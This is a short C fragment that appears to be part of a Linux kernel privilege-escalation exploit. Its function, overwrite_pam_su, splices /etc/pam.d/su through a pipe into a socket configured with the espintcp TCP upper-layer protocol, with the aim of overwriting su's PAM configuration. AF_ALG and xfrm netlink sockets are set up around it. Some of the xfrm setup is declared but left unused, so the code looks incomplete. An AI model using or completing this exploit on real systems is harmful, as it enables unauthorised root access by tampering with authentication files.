#include <linux/if_alg.h>
#include <linux/netlink.h>
#include <linux/xfrm.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <unistd.h>

#ifndef TCP_ULP
#define TCP_ULP 31
#endif
#ifndef TCP_ENCAP_ESPINTCP
#define TCP_ENCAP_ESPINTCP 7
#endif

void overwrite_pam_su(int cfd, int pp[2], loff_t off) {
    const char *pam_target = "/etc/pam.d/su";
    struct sockaddr_alg sa = { .salg_family = AF_ALG, .salg_type = "skcipher", .salg_name = "ecb(aes)" };
    int alg = socket(AF_ALG, SOCK_SEQPACKET, 0);
    bind(alg, (struct sockaddr *)&sa, sizeof(sa));

    int xfd = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    struct xfrm_usersa_info xs = {0};
    struct xfrm_encap_tmpl enc = { .encap_type = TCP_ENCAP_ESPINTCP };
    int msg_type = XFRM_MSG_NEWSA;
    (void)xfd; (void)xs; (void)enc; (void)msg_type;

    int fd = open(pam_target, O_RDONLY);
    splice(fd, &off, pp[1], NULL, 4096, 0);
    splice(pp[0], NULL, cfd, NULL, 4096, 0);
    setsockopt(cfd, IPPROTO_TCP, TCP_ULP, "espintcp", 8);
}
